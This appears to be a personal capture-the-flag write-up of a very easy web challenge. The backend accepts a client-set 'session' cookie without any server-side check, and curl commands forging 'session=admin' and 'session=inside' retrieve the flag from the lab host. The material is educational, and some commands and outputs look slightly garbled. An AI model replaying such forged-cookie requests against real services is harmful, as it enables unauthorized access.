---
type: writeup
date: 2026-07-25
source: ctf
category: web exploitation
difficulty: very easy
status: complete
tags:
  - web
---

## Target

- Source: Elysia (Bun/TS) backend + React frontend, nginx in front
- Target: http://154.57.164.71:31733

## Recon

- read `app/index.ts` and found cookie config to be written in conditional statements such as if session.value !== admin, return Unauthorized or if session.value !== inside, return enter castle first.
- **Verified** the per-route schema by using curl commands

```bash
curl -i http://154.57.164.71:31733/api/me -H "Cookie: session=admin"
```

--> `{"authenticated":true}`

## Vulnerability

- The 'session' cookie is never verified server-side. Authentication is literally just whether or not session.value equals 'admin' or 'inside'.

## Exploitation

- `/api/flag` required a POST, unlike `/api/me`.

```bash
curl -i -X POST http:154.57.164.71:31733/api/flag -H "Cookie: session=inside"
```

--> `{"authenticated":flag}`

flag = HTB{…}

## Lessons Learned

**Delays**

- scanning through different directories and files before finding the one i had to dive in.

**New tricks**

- learnt curl command
- used the curl flag -X POST to use POST method instead of its default GET method
- used the curl flag -H "Cookie: session=inside" to specific the cookie I want to use to get inside the gates.
- Validation must be wired into every path, not just declared globally (primitive configuration).
